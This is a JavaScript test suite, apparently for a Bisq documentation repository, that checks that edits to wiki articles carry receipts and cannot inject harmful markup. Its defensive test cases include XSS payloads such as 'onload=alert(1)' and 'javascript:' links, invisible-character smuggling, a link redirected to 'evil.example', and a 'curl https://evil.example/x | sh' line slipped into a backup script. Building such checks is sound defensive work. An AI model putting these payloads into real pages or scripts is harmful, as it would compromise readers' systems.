    [after("| a | b |\n| - | - |\n| 1 | 2 |"), /adds or removes a code block, table or recovery gap marker/],
    [after("> Quoted"), /adds or removes <blockquote>/],
    [after("***"), /adds or removes <hr>/],
    [after("- [ ] task"), /adds or removes <(?:ul class|li class|input)/],
    [after("3. Third"), /adds or removes <ol start="3">/],
    [after("<div>Injected block</div>"), /adds or removes <div>/],
    // HTML that would reach past the article on the page.
    [original.replace("Specify your explorer\\'s address on the Bisq settings screen.", 'Specify <a href="https://example.org">your explorer\\\'s address on the Bisq settings screen.'), /changes the page around the article: it leaves an element open, closes one it did not open, or carries formatting past its end/],
    [after("</div>\n\nOutside the article."), /changes the page outside the article body|changes the page around the article/],
    [after("<div>\n\nUnclosed."), /changes the page around the article: it leaves an element open/],
  ]) {
    assert.notEqual(edited, original);
    onlyFinding(await run({ [path]: edited }, [receipt(original, edited)]), pattern);
  }
  const plain = inject(' **Note:** see [the source](https://github.com/bisq-network/bisq), <https://bisq.network/>, `bisq-desktop`, *this* and <a href="../trading-rules/">the rules</a>.');
  assert.deepEqual((await run({ [path]: plain }, [receipt(original, plain)])).failures, []);
  const list = after("- An added list item\n- And another, with a hard  \n  line break");
  assert.deepEqual((await run({ [path]: list }, [receipt(original, list)])).failures, []);
});

test("a receipt names a pull request of this repository, a real date and no endorsement", async () => {
  for (const [fields, pattern] of [
    [{ pull_request: "https://github.com/someone/fork/pull/1" }, /pull request URL of this repository/],
    [{ summary: "Verified by Bisq support." }, /not call it verified, official or approved/],
    [{ accepted_on: "2026-02-31" }, /accepted_on must be a real YYYY-MM-DD date/],
  ]) {
    const result = await run({ [path]: reworded }, [receipt(original, reworded, fields)]);
    assert.ok(result.failures.some((failure) => pattern.test(failure)), result.failures.join("\n"));
  }
});

test("an accepted edit may not change the words around a recovery safeguard", async () => {
  for (const edited of [
    restore.replace("Start Bisq again: it should start", "Do not Start Bisq again: it should start"),
    restore.replace("after deleting the fresh one you created", "after deleting the fresh one you created (not reversible in practice)"),
  ]) {
    assert.notEqual(edited, restore);
    onlyFinding(await run({ [restorePath]: edited }, [restoreReceipt(restore, edited)]), /changes the text around the recovery safeguard/);
  }
});

// The Markdown conversion (migration/markdown-format.json).

test("a recorded conversion pins its Markdown: a later change is wording", async () => {
  // Even a change the page does not show needs a receipt once the conversion is recorded.
  const spaced = original.replace("one of the most active markets", "one of the most  active markets");
  assert.equal(await formatDifference({ slug: "trading-monero", html: htmlOriginal, markdown: spaced }), undefined);
  onlyFinding(await run({ [path]: spaced }, []), /Trading Monero changed since its Markdown conversion .*no receipt/);
  assert.deepEqual((await run({ [path]: spaced }, [], 2, withBase)).awaiting.map((item) => item.slug), ["trading-monero"]);
  // An article put back to its HTML while its conversion is recorded fails as well.
  onlyFinding(await run({ [path]: htmlOriginal }, []), /Trading Monero is the restored HTML, but migration\/markdown-format\.json records its Markdown conversion/);
});

test("a conversion and a wording change are separate pull requests", async () => {
  // The base is still HTML; the pull request converts the article and rewords it.
  onlyFinding(await run({ [path]: reworded }, [], 2, withHtmlBase), /cannot be checked as awaiting a receipt: its base file is the HTML before its Markdown conversion, but this change also converts it/);
  // The conversion on its own passes without a receipt.
  const result = await run({}, [], 2, withHtmlBase);
  assert.deepEqual([result.failures, result.awaiting], [[], []]);
  assert.ok(result.convertedCount >= 2);
});

test("a conversion must render as the HTML it replaced, with nothing but invisible whitespace normalized", async () => {
  const differs = (markdown) => formatDifference({ slug: "trading-monero", html: htmlOriginal, markdown });
  // Whitespace a browser does not show: a doubled space, a line break in a paragraph, a space at a line end.
  assert.equal(await differs(original.replace("one of the most active markets", "one of the most\nactive  markets")), undefined);
  assert.equal(await differs(original.replace("This article covers some things", "This article covers  some things")), undefined);
  assert.equal(await differs(original.replace("### Settings {#settings}", "### Settings  {#settings}")), undefined);
  // A text change hidden by whitespace, or whitespace the page shows, still fails.
  for (const [markdown, pattern] of [
    [original.replace("one of the most active markets", "one of the mostactive markets"), /renders differently .*became " is one of the mostactive markets/],
    [original.replace("one of the most active markets", "one of the mo st active markets"), /renders differently/],
    [original.replace("one of the most active markets", "one of the most active markets"), /renders differently/],
    [original.replace("get_tx_key \\<TXID>", "get_tx_key  \\<TXID>"), /renders differently .*<code class="wiki-source-code" id="source-code-1">/],
    [original.replace("**Monero (XMR)** is", "**Monero (XMR)**is"), /renders differently/],
    [original.replace("(default: 1 BTC)", "(default: 1 BTC)<!-- -->"), /renders differently/],
    [original.replace("[XMR Chain](https://xmrchain.net/)", "[XMR Chain](https://xmrchain.net)"), /renders differently .*<a href="https:\/\/xmrchain\.net"/],
    [original.replace("[XMR Chain](https://xmrchain.net/)", '<a href="https://xmrchain.net/">XMR Chain</a>'), /renders differently .*<a href="https:\/\/xmrchain\.net\/">/],
    [original.replace("Auto-confirming trades verify", "<span></span>Auto-confirming trades verify"), /renders differently .*<span>/],
    [original.replace("### Settings {#settings}", "### Set tings {#settings}"), /renders differently .*<h3 id="settings">: "Settings" became "Set tings"/],
    [original.replace('title: "Trading Monero"', 'title: "Trading XMR"'), /front matter .* differs/],
  ]) {
    assert.notEqual(markdown, original);
    assert.match(await differs(markdown) ?? "no difference found", pattern);
  }
  // The HTML side must render as itself, so a renderer change cannot make both sides empty.
  const blankLine = htmlOriginal.replace("</p>\n<span class=\"wiki-legacy-anchor\" id=\"Instant_payment_accounts\"", "</p>\n\n    indented\n<span class=\"wiki-legacy-anchor\" id=\"Instant_payment_accounts\"");
  assert.notEqual(blankLine, htmlOriginal);
  assert.match(await formatDifference({ slug: "trading-monero", html: blankLine, markdown: original }), /the HTML file does not render as itself/);
});

test("an accepted HTML edit can be converted: the HTML is rebuilt and every link is checked", async () => {
  const markdownReworded = reworded;
  const second = markdownReworded.replace("Number of required confirmations (default: 5)", "Number of required confirmations (Bisq 1 v1.10.11 default: 5)");
  const htmlEdit = receipt(htmlOriginal, htmlReworded);
  const markdownEdit = receipt(markdownReworded, second, { pull_request: "https://github.com/hiciefte/bisq-docs/pull/99" });
  const world = { files: convertedFiles, conversions: [conversionOf(path, htmlReworded, markdownReworded), conversionOf(restorePath)] };
  const result = await run({ [path]: second }, [htmlEdit, markdownEdit], 2, {}, world);
  assert.deepEqual(result.failures, []);
  assert.equal(result.acceptedCount, 2);
  // The conversion must start where the HTML edit ended.
  const early = { files: convertedFiles, conversions: [conversionOf(path, htmlOriginal, markdownReworded), conversionOf(restorePath)] };
  onlyFinding(await run({ [path]: second }, [htmlEdit, markdownEdit], 2, {}, early), /PR #46 receipt is based on sha256 .*, but the earlier accepted edit \(PR #99\) produced/);
  // An accepted HTML edit is still checked on its own page.
  const hidden = htmlOriginal.replace("(default: 1 BTC)", "(default: 1 BTC) <span hidden>hidden</span>");
  const hiddenMarkdown = original.replace("(default: 1 BTC)", "(default: 1 BTC) <span hidden>hidden</span>");
  const sneaky = { files: convertedFiles, conversions: [conversionOf(path, hidden, hiddenMarkdown), conversionOf(restorePath)] };
  onlyFinding(await run({ [path]: hiddenMarkdown }, [receipt(htmlOriginal, hidden)], 2, {}, sneaky), /PR #46 adds or removes <span hidden>/);
});

// Review findings (PR #188), each a confirmed attack.

const committedArticle = (slug) => readFileSync(`src/content/docs/wiki/${slug}.md`, "utf8");
const receiptFor = (slug, base, edited, fields = {}) => receipt(base, edited, { slug, note_ids: [], ...fields });
/** The committed conversion record with slug's Markdown hash set to markdown: a re-recorded conversion. */
const rerecorded = (slug, markdown) => markdownFormatText([...committedFormat.map((item) => (item.slug === slug ? { ...item, markdown_file_sha256: hash(markdown) } : item)), ...markdown_samples()]);
function markdown_samples() { return [conversionOf(path), conversionOf(restorePath)]; }

test("tags that act on the page's own elements fail, with a receipt, awaiting one, or as a re-recorded conversion", async () => {
  const teams = committedArticle("teams");
  for (const [find, replacement] of [
    ["Bisq is a [FOSS]", 'Bisq is a <body onload="alert(1)">[FOSS]'],
    ["There is no CEO.", 'There is no CEO.<body onpageshow="document.title=\'pwned\'">'],
    ["\n## Control {#control}", '\n<html hidden style="display:none">\n\n## Control {#control}'],
    ["\n## Control {#control}", "\n<body inert>\n\n## Control {#control}"],
    ["\n## Control {#control}", "\n</body></html>\n\n## Control {#control}"],
    ["There is no CEO.", 'There is no CEO.<body dir="rtl" style="unicode-bidi:bidi-override">'],
    ["There is no CEO.", "There is no CEO.</main>"],
    ["There is no CEO.", "There is no CEO.<frameset></frameset>"],
  ]) {
    const edited = teams.replace(find, replacement);
    assert.notEqual(edited, teams, replacement);
    const pattern = /teams\.md: .*changes the page around the article: it has a <\/?(?:body|html|main|frameset)> tag/;
    onlyFinding(await run({ "src/content/docs/wiki/teams.md": edited }, [receiptFor("teams", teams, edited)]), pattern);
    onlyFinding(await run({ "src/content/docs/wiki/teams.md": edited }, [], 2, { readBase: baseFrom(new Map([["src/content/docs/wiki/teams.md", teams]])) }), pattern);
    onlyFinding(await run({ "src/content/docs/wiki/teams.md": edited, [markdownFormatPath]: rerecorded("teams", edited) }, []), /teams\.md: its Markdown conversion .* changes the page around the article: it has a/);
  }
});

test("the page is checked as readers get it, after the page's string replacements", async () => {
  // A line break instead of the space before a gap marker's <small>: invisible as HTML,
  // but the page's link repair no longer matches, so the page links other text.
  const troubleshooting = committedArticle("troubleshooting");
  const edited = troubleshooting.replace("Delete and resync SPV file <small>", "Delete and resync SPV file\n<small>");
  assert.notEqual(edited, troubleshooting);
  const html = readFileSync(preservedArticlePath("troubleshooting"), "utf8");
  assert.match(await formatDifference({ slug: "troubleshooting", html, markdown: edited }), /the Markdown renders differently from the HTML it replaced/);
  onlyFinding(await run({ "src/content/docs/wiki/troubleshooting.md": edited, [markdownFormatPath]: rerecorded("troubleshooting", edited) }, []), /troubleshooting\.md: its Markdown conversion .* does not render as the HTML it replaced/);
  onlyFinding(await run({ "src/content/docs/wiki/troubleshooting.md": edited }, [receiptFor("troubleshooting", troubleshooting, edited)]), /troubleshooting\.md: PR #46 (?:adds or removes|changes gap:#my-wallet-has-an-incorrect-balance:1)/);
});

test("a figure, its link and its caption stay as restored", async () => {
  const wrapped = original.replace(/(<figure class="wiki-source-image" id="source-image-1"><a href="[^"]+">)(<img [^>]+>)(<\/a>)/, '$1$3<a href="https://evil.example/">$2</a>');
  const captioned = original.replace("<figcaption>XMR auto confirm<br>", "<figcaption>Official XMR settings<br>");
  for (const edited of [wrapped, captioned]) {
    assert.notEqual(edited, original);
    onlyFinding(await run({ [path]: edited }, [receipt(original, edited)]), /PR #46 changes the figure source-image-1 or the link that opens it/);
  }
});

test("code blocks, tables and gap markers change only when the receipt lists them", async () => {
  // A shell command in a code block.
  const scriptPath = "src/content/docs/wiki/automatic-backup-script.md";
  const script = committedArticle("automatic-backup-script");
  const code = script.replace("chmod +x bisq1backup\nnano", "chmod 777 bisq1backup && curl https://evil.example/x | sh\nnano");
  assert.notEqual(code, script);
  onlyFinding(await run({ [scriptPath]: code }, [receiptFor("automatic-backup-script", script, code)]), /PR #46 changes source-code-3 \(a code block, table or recovery gap marker\); these change only when the receipt lists them in changed_locked_content/);
  assert.deepEqual((await run({ [scriptPath]: code }, [receiptFor("automatic-backup-script", script, code, { changed_locked_content: ["source-code-3"] })])).failures, []);
  const awaiting = await run({ [scriptPath]: code }, [], 2, { readBase: baseFrom(new Map([[scriptPath, script]])) });
  assert.deepEqual([awaiting.failures, awaiting.awaiting.map(awaitingLine)], [[], ["automatic-backup-script: source-code-3 (code block, table or recovery gap marker) changed; its receipt must list it in changed_locked_content"]]);
  onlyFinding(await run({ [path]: reworded }, [receipt(original, reworded, { changed_locked_content: ["table:top:1"] })]), /PR #46 lists table:top:1 in changed_locked_content, but it is unchanged/);
  assert.match((await run({ [path]: reworded }, [receipt(original, reworded, { changed_locked_content: ["table-1"] })])).failures.join("\n"), /changed_locked_content must list code blocks, tables and gap markers such as source-code-3/);
  // A table cell and a gap marker in other articles.
  for (const [slug, find, replacement, key] of [
    ["bitcoin-units", "<td>100,000,000,000,000</td>", "<td>200,000,000,000,000</td>", "table:"],
    ["critical-bugs", "[section not recovered: Delivered]", "[section recovered]", "gap:"],
    ["critical-bugs", ' <small class="wiki-link-gap">[section not recovered: Delivered]</small>', "", "gap:"],
  ]) {
    const article = committedArticle(slug);
    const edited = article.replace(find, replacement);
    assert.notEqual(edited, article);
    const result = await run({ [`src/content/docs/wiki/${slug}.md`]: edited }, [receiptFor(slug, article, edited)]);
    assert.equal(result.failures.length, 1, result.failures.join("\n"));
    assert.match(result.failures[0], new RegExp(`${slug}\\.md: PR #46 (?:changes ${key}\\S+:\\d+|adds or removes a code block, table or recovery gap marker)`));
  }
});

test("code blocks, tables and gap markers keep their names when others change, and count as changed when moved", async () => {
  // Review round 2 (PR #188): dropping one gap renumbered every later one, and a moved
  // code block needed no listing.
  const teams = committedArticle("teams");
  const gapless = teams.replace('<span class="wiki-link-gap">DAO <small>[unrecovered article: DAO]</small></span>', "DAO");
  const moved = gapless.replace("should check out the [Contributor Checklist](../contributor-checklist/).", 'should check out the [Contributor Checklist](../contributor-checklist/) and <span class="wiki-link-gap">DAO <small>[unrecovered article: DAO]</small></span>.');
  assert.notEqual(moved, gapless);
  const result = await run({ "src/content/docs/wiki/teams.md": moved }, [receiptFor("teams", teams, moved)]);
  assert.equal(result.failures.length, 1, result.failures.join("\n"));
  assert.match(result.failures[0], /teams\.md: PR #46 (?:adds or removes a code block, table or recovery gap marker \(gap:top:1 gone, gap:#\S+:\d+ new\)|changes gap:)/);
  const scriptPath = "src/content/docs/wiki/automatic-backup-script.md";
  const script = committedArticle("automatic-backup-script");
  const block = script.match(/<pre><code class="wiki-source-code" id="source-code-3">[\s\S]*?<\/code><\/pre>\n/)[0];
  // Moved above the paragraph it followed, unchanged.
  const before = 'Create a <code class="wiki-source-code" id="source-code-1">scripts</code> folder';
  const reordered = script.replace(block, "").replace(before, `${block}\n${before}`);
  assert.notEqual(reordered, script);
  onlyFinding(await run({ [scriptPath]: reordered }, [receiptFor("automatic-backup-script", script, reordered)]), /PR #46 changes source-code-3 \(a code block, table or recovery gap marker\)/);
});

test("invisible characters are added only when the receipt lists them", async () => {
  // Review round 2 added default-ignorable, control, unassigned and private-use characters.
  for (const [character, label] of [["\u200b", "U+200B"], ["\u202e", "U+202E"], ["\u2066", "U+2066"], ["\u00ad", "U+00AD"],
    ["\u17b4", "U+17B4"], ["\u17b5", "U+17B5"], ["\u180b", "U+180B"], ["\u180f", "U+180F"], ["\ufff0", "U+FFF0"], ["\u{e0080}", "U+E0080"],
    ["\u0001", "U+0001"], ["\u0085", "U+0085"], ["\ue000", "U+E000"]]) {
    const edited = original.replace("one of the most active markets", `one of the most${character} active markets`);
    onlyFinding(await run({ [path]: edited }, [receipt(original, edited)]), new RegExp(`PR #46 adds invisible characters \\(${label.replace("+", "\\+")}\\)`));
    assert.deepEqual((await run({ [path]: edited }, [receipt(original, edited, { added_invisible_characters: [label] })])).failures, []);
    assert.equal(awaitingLine((await run({ [path]: edited }, [], 2, withBase)).awaiting[0]), `trading-monero: invisible characters ${label} added; its receipt must list it in added_invisible_characters`);
  }
  onlyFinding(await run({ [path]: reworded }, [receipt(original, reworded, { added_invisible_characters: ["U+200B"] })]), /PR #46 lists U\+200B in added_invisible_characters, but adds no such character/);
  // Judged by position, not by count: a later edit that moves one, or swaps one for
  // another at the same place, must list it again.
  const later = (base, edited) => receipt(base, edited, { pull_request: "https://github.com/hiciefte/bisq-docs/pull/99" });
  const withZwsp = original.replace("one of the most active markets", "one of the most\u200b active markets");
  const first = receipt(original, withZwsp, { added_invisible_characters: ["U+200B"] });
  for (const [edited, label] of [
    // Moved into a link's URL, and into a number: the same count before and after.
    [withZwsp.replace("most\u200b active", "most active").replace("(https://monero.com/explorer)", "(https://monero\u200b.com/explorer)"), "U\\+200B"],
    [withZwsp.replace("most\u200b active", "most active").replace("(default: 1 BTC)", "(default: 1\u200b0 BTC)"), "U\\+200B"],
    [withZwsp.replace("most\u200b active", "most\u200e active"), "U\\+200E"],
  ]) {
    assert.notEqual(edited, withZwsp);
    onlyFinding(await run({ [path]: edited }, [first, later(withZwsp, edited)]), new RegExp(`PR #99 adds invisible characters \\(${label}\\)`));
  }
  const withLrm = original.replace("one of the most active markets", "one of the most\u200e active markets");
  const swapped = withLrm.replace("\u200e", "\u200f");
  onlyFinding(await run({ [path]: swapped }, [receipt(original, withLrm, { added_invisible_characters: ["U+200E"] }), later(withLrm, swapped)]), /PR #99 adds invisible characters \(U\+200F\)/);
  assert.deepEqual((await run({ [path]: swapped }, [receipt(original, withLrm, { added_invisible_characters: ["U+200E"] }), later(withLrm, swapped)].map((item, index) => (index ? { ...item, added_invisible_characters: ["U+200F"] } : item)))).failures, []);
  // A hand-written receipt whose change boundary splits a character reference
  // ({ original: "", accepted: "&#x200" } before an existing "B"): in HTML the parser
  // reads "&#x200Bisq" as U+200B and "isq", so the rendered text decides, not the change
  // strings or the count. (Markdown text needs the semicolon, so there it stays visible.)
  const htmlWithZwsp = htmlOriginal.replace("one of the most active markets", "one of the most\u200b active markets");
  const htmlSplit = htmlWithZwsp.replace("most\u200b active", "most active").replace("markets on Bisq.", "markets on &#x200Bisq.");
  const firstHtml = receipt(htmlOriginal, htmlWithZwsp, { added_invisible_characters: ["U+200B"] });
  const handMade = later(htmlWithZwsp, htmlSplit);
  handMade.changes = handMade.changes.map((change) => (change.accepted.includes("&#x200Bisq") ? { ...change, column: change.column + change.accepted.indexOf("&#x200"), original: "", accepted: "&#x200" } : change));
  assert.ok(handMade.changes.some((change) => change.accepted === "&#x200" && change.original === ""), JSON.stringify(handMade.changes));
  assert.equal(undoAcceptedEdit(htmlSplit, handMade), htmlWithZwsp);
  onlyFinding(await runHtml({ [path]: htmlSplit }, [firstHtml, handMade]), /trading-monero\.md: PR #99 adds invisible characters \(U\+200B\)/);
  // A character reference in Markdown counts as the character it stands for.
  const encoded = original.replace("one of the most active markets", "one of the most&#x200B; active markets");
  onlyFinding(await run({ [path]: encoded }, [receipt(original, encoded)]), /PR #46 adds invisible characters \(U\+200B\)/);
  assert.match((await run({ [path]: reworded }, [receipt(original, reworded, { added_invisible_characters: ["200B"] })])).failures.join("\n"), /added_invisible_characters must list code points such as U\+200B/);
});

// HTML articles: not yet converted, they are checked as before, and on their rendered page too.

test("HTML article: an edit with a receipt passes, without one it fails or awaits", async () => {
  assert.deepEqual((await runHtml({ [path]: htmlReworded }, [receipt(htmlOriginal, htmlReworded)])).failures, []);
  onlyFinding(await runHtml({ [path]: htmlReworded }, []), /^src\/content\/docs\/wiki\/trading-monero\.md: Trading Monero changed since restoration .*no receipt in migration\/accepted-edits\/ covers it/);
  const result = await runHtml({ [path]: htmlReworded }, [], 2, withHtmlBase);
  assert.deepEqual([result.failures, result.awaiting.map((item) => item.slug)], [[], ["trading-monero"]]);
  // A receipt against the original before its recorded line-break formatting fails.
  const preFormatting = JSON.parse(readFileSync("migration/restoration-fidelity.json", "utf8")).items.find((item) => item.slug === "trading-monero").restored_file_sha256;
  onlyFinding(await runHtml({ [path]: htmlReworded }, [receipt(htmlOriginal, htmlReworded, { based_on_file_sha256: preFormatting })]), /PR #46 receipt is based on sha256 .*, but the restored baseline of this article \(original plus recorded line-break formatting\) is/);
  onlyFinding(await runHtml({}, [receipt(htmlOriginal, htmlReworded)]), /Trading Monero is unchanged since restoration, but PR #46 has a receipt/);
});

test("HTML article: structure, markup and blank lines are checked as before", async () => {
  for (const [edited, pattern] of [
    [htmlOriginal.replace('<h3 id="settings"> Settings </h3>', '<h3 id="preferences"> Settings </h3>'), /PR #46 changes heading 8 \(<h3 id="settings"> Settings <\/h3> became <h3 id="preferences"> Settings <\/h3>\)/],
    [htmlOriginal.replace('<span class="wiki-legacy-anchor" id="Settings" aria-hidden="true"></span>', ""), /PR #46 removes anchor #Settings/],
    [htmlOriginal.replace('<img alt="XMR auto confirm"', '<img alt="Historical XMR auto-confirm settings"'), /PR #46 changes the image source-image-1; only alt text may change/],
    [htmlOriginal.replace('title: "Trading Monero"', 'title: "Trading XMR"'), /PR #46 changes text outside the article body/],
    [htmlOriginal.replace("(default: 1 BTC)", ' (default: 1 BTC) <IMG SRC="https://example.org/x.png">'), /adds or removes <IMG SRC=/],
    [htmlOriginal.replace("(default: 1 BTC)", "(default: 1 BTC) <span hidden>hidden</span>"), /adds or removes <\/?span/],
    [htmlOriginal.replace("(default: 1 BTC)", '(default: 1 BTC) <a href="javascript:alert(1)">x</a>'), /adds or removes <a href="javascript:/],
    [htmlOriginal.replace("(default: 1 BTC)", "(default: 1 BTC)<!-- hidden -->"), /adds or removes an HTML comment/],
    [htmlOriginal.replace("(default: 1 BTC)", "(default: 1 BTC)\n\n## Injected heading\n\n"), /adds or removes a blank line/],
    // An unclosed link before the article's end would carry into the page after it.
    [htmlOriginal.replace("Specify your explorer's address", 'Specify <a href="https://example.org">your explorer\'s address'), /changes the page around the article: it leaves an element open, closes one it did not open, or carries formatting past its end/],
  ]) {
    assert.notEqual(edited, htmlOriginal);
    onlyFinding(await runHtml({ [path]: edited }, [receipt(htmlOriginal, edited)]), pattern);
  }
  const plain = htmlOriginal.replace("(default: 1 BTC)", '(default: 1 BTC) <strong>Note:</strong> see <a href="https://github.com/bisq-network/bisq" rel="noopener">the source</a>.');
  assert.deepEqual((await runHtml({ [path]: plain }, [receipt(htmlOriginal, plain)])).failures, []);
  const htmlRestore = restoredFiles.get(restorePath);
  const weakened = htmlRestore.replace("btc_mainnet/tor/hiddenservice", "btc_mainnet/tor");
  onlyFinding(await runHtml({ [restorePath]: weakened }, [{ ...restoreReceipt(htmlRestore, weakened), changed_locked_content: ["source-code-7"] }]), /last-resort-restore\.md: lost recovery safeguard: btc_mainnet\/tor\/hiddenservice/);
});
